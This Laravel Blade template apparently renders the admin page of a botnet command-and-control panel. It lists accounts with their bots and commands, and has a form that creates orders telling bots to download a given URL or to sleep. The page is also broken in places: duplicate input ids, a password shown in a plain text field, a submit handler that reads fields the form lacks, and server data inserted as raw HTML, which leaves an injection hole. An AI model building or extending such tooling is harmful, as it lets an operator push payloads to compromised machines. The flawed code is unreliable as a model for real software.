@extends('Panel.Master.Master')

@section('content')

    <div class="col-md-12 col-centered" style="max-height: 500px">
        <div class="panel panel-default">

            <div class="panel-heading" style="height: 40px;color: #b3b3b3; background-color: rgba(0, 0, 0, 0.79); border-color: #c5c5c5; text-align: center">

                <p style="color: white;font-weight: bold">Accounts</p>

            </div>

            <div class="panel-body " style="  overflow: scroll; direction:rtl;max-height: 500px">

                <div class="row-in-panel header">
                    <div class="table-row" style="width: 5%; border-left: 1px solid white">
                        <p>Id</p>
                    </div>
                    <div class="table-row" style="width: 35%">
                        <p>UserName</p>
                    </div>
                    <div class="table-row" style="width: 10%">
                        <p>Level</p>
                    </div>
                    <div class="table-row" style="width: 15%">
                        <p>Created_at</p>
                    </div>
                    <div class="table-row" style="width: 15%">
                        <p>Bots</p>
                    </div>
                    <div class="table-row" style="width: 20%">
                        <p>Comands</p>
                    </div>
                </div>

                <!--Loop-->
                <div class="userDom"></div>

            </div>
        </div>
    </div>

    <button type="button" class="btn btn-primary bmd-btn-fab" id="modalTrigger" style="position: absolute; bottom: 10px; right: 10px;width: 50px;height: 50px; background-color: white">
        <img class="col-centered" src="{{ URL::asset('img/60785.svg') }}" style="width: 21px; display: block">
    </button>

    <div class="modal fade" id="squarespaceModal" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content" style="border: 1px solid #737373;  background-color: rgba(0, 0, 0, 0.84); box-shadow: 0px 0px 5px 3px;">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true" style="color:white"><b>×</b></span><span class="sr-only">Close</span></button>

                    <img class="col-centered" src="{{ URL::asset('img/196849.svg') }}" style="width: 51px; display: block">

                </div>
                <div class="modal-body">

                    <form class="materialInputs">



                        <div style="margin-bottom: 10px"></div>

                        <div class="md-form dataDiv" >
                            <input type="text" id="username" class="form-control"  style="color: white">
                            <label for="data" class="labelData" style="color: #f3f3f3;">Username</label>
                        </div>

                        <div class="md-form dataDiv" >
                            <input type="text" id="username" class="form-control"  style="color: white">
                            <label for="data" class="labelData" style="color: #f3f3f3;">Password</label>
                        </div>

                        <div class="form-group" style="margin-top: 10px;">
                            <!-- Button -->
                            <div class="controls col-centered">
                                <button id="submitNew" type="button" href="#" class="btn btn-primary col-centered" style="display: block; width:100%;border: 1px solid #ffffff6e;float: none; margin: 0 auto ;background-color: #3a3a3a;">Create</button>
                            </div>
                        </div>

                    </form>


                </div>
            </div>
        </div>
    </div>

@endsection


@section('Script')
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.4.3/js/mdb.min.js"></script>
    <script type="text/javascript" src="{{ URL::asset('js/libs/selectBoxLib.js') }}"></script>
    <script>

        var take = 20;
        function reCall_(data){
            //Verify if it
            if(data['status'] === 1){
                function popUsers(array){
                    $('.userDom').empty();

                    array['data'].forEach(function (el){
                        let html = '<div class="row-in-panel line">' +
                                '<div class="table-row" style="width: 5%; border-left: 1px solid white">' +
                                '<p>'+el['id']+'</p>' +
                                ' </div>' +
                                '<div class="table-row" style="width: 35%">' +
                                '<p>'+el['username']+'</p>' +
                                '</div>' +
                                '<div class="table-row" style="width: 10%">' +
                                ' <p>'+el['level']+'</p>' +
                                ' </div>' +
                                '<div class="table-row" style="width: 15%">' +
                                '<p>'+el['created_at']+'</p>' +
                                '</div>' +
                                '<div class="table-row" style="width: 15%">' +
                                '<p>'+el['bots']+'</p>' +
                                '</div>' +
                                '<div class="table-row" style="width: 20%">' +
                                '<a>' +el['commands']+ '</a>' + '</div>';

                        $('.userDom').append(html);
                    });

                    //Set seeMor btn
                    if(array['seeMore'] == 1){
                        let seeMore = '<div class="controls col-centered" style="margin-top: 15px">' +
                                '<button id="seeMore" type="button" href="#" class="btn btn-primary col-centered waves-effect waves-light" style="display: block; width:100%;border: 1px solid #ffffff6e;float: none; margin: 0 auto ;background-color: #3a3a3a;">See More</button>'+
                                '</div>';
                        $('.userDom').append(seeMore);
                    }
                };
                popUsers(data)
            }
        };
        function refreshFunction(){
            ajax({dataRequest: 'userMain',take:take});
        };
        function userStatus(id){

            let data = {dataRequest:'userStatus', id:id};
            $.post(ajaxURL,data)
                    .done(function(data){

                        if(data == 0){
                            toastr.error('Hummm Bad', 'Fail!')
                        }
                        else{
                            toastr.success('all Ok', 'Changed');
                        }
                        refreshFunction();
                    })

        };
        function afterTrigger(){
            let arr = {
                'action':$('[data-input="action"]').val(),
                'data':$('[data-input="data"]').val()
            };
            formatExample(arr);
        };
        function formatExample(array){

            let action = array['action'];
            let data = array['data'];

            if(action === "Download" || action == "download"){
                $('.dataDiv label').html('Url')
                let code = '{<b style="color:#2aca3b">action</b> : <b style="font-size: 80%; font-weight: lighter">download</b> , <b style="color:#2aca3b">url</b> :<b style="font-size: 80%; font-weight: lighter"> '+data+'</b>}';
                $('.exampleCode p').html(code);
            }
            else if(action === "Sleep" || action == "sleep"){
                $('.dataDiv label').html('Time')
                let code = '{<b style="color:#2aca3b">action</b> : <b style="font-size: 80%; font-weight: lighter">sleep</b> , <b style="color:#2aca3b">sleep_time</b> :<b style="font-size: 80%; font-weight: lighter">'+data+'</b>}';
                $('.exampleCode p').html(code);
            }
        };
        afterTrigger();

        //Stop Order
        $(document).on('click', '.stopBtn', function(){
            userStatus($(this).data('id'));
        });
        //SeeMore trigger
        $(document).on('click', '#seeMore', function(){
            take = take + 10;
            refreshFunction();
        });
        //Modal trigger
        $(document).on('click','#modalTrigger', function(){
            $(document).find('#squarespaceModal').modal('show');
        });
        //Select Box
        $('.md-form ').on('change', function(){
            afterTrigger();
        });
        //Submit Modal
        $(document).on('click', '#submitNew', function(){

            //Validate
            if($('[data-input="data"]').val() != ''){
                ///trigger toust
                let data = {dataRequest: 'createOrder',action:$('[data-input="action"]').val(), data:$('[data-input="data"]').val()}
                $.post(ajaxURL,data)
                        .done(function(data){

                            if(data['type'] =='fail'){
                                toastr.error(data['msg'], 'Fail!')
                            }else{
                                toastr.success(data['msg'], 'Added!');
                            }

                        })

                refreshFunction();
                $(document).find('#squarespaceModal').modal('hide');
            }else{
                toastr.error('Set up '+$('.labelData').html()+'', 'Fail!')
            }

        });

        refreshFunction();
        setInterval(refreshFunction,60000);

    </script>
@endsection

@section('css')
    <style>

        /** DataTable
        **/
        .row-in-panel-less p{
            font-size: 75%;
            margin-top: 5px;
        }
        .row-in-panel.header{
            width: 100%;
            height: 23px;
            border-top: 1px solid white;
            border-bottom: 1px solid white;
        }
        .row-in-panel.header .table-row{
            float: left;
            text-align: center;
            border-right: 1px solid white;
            height: 100%;
        }
        .row-in-panel{
            width: 100%;
            height: 23px;
            border-bottom: 1px solid white;
        }
        .row-in-panel .table-row{
            float: left;
            text-align: center;
            border-right: 1px solid white;
            height: 100%;
        }
        .table-row p{
            color: #ffffff;
        }
        .row-in-panel.line .table-row p{
            font-size: 75%;
            margin-top:5px;
        }
        .dataJsonTitle{
            color:#6e63e8
        }
        .dataJsonLight{
            font-size: 90%;
            font-weight: lighter;
        }
        .stopBtn{
            width: 65px;
            height: 15px;
            border: 1px solid white;
            margin-top: 3px;
            border-radius: 5px;
        }
        .stopBtn p{
            font-weight: bold;
            font-size: 70%;
        }

    </style>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.4.3/css/mdb.min.css" rel="stylesheet">
    <link rel="stylesheet" href="{{ URL::asset('css/selectBoxLib.css') }}">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.4.3/css/mdb.min.css" rel="stylesheet">
@endsection